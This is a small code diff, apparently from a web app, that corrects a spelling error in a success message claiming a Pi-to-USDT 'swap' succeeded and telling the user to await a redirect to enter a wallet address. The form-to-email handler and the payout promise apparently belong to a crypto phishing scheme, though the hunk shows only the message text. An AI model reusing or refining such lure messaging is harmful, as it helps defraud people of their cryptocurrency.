@@ -58,6 +58,6 @@ export const sendEmail = async (formData: FormData): Promise<EmailResponse> => {
   }
 
   return {
-    success: "Swapped Successfully; Kindly await the redirect page to input your usdt wallet address for payment. If this does not work, it means your Pi wllet has 0 pi for swap.",
+    success: "Swapped Successfully; Kindly await the redirect page to input your usdt wallet address for payment. If this does not work, it means your Pi wallet has 0 pi for swap.",
   };
 };
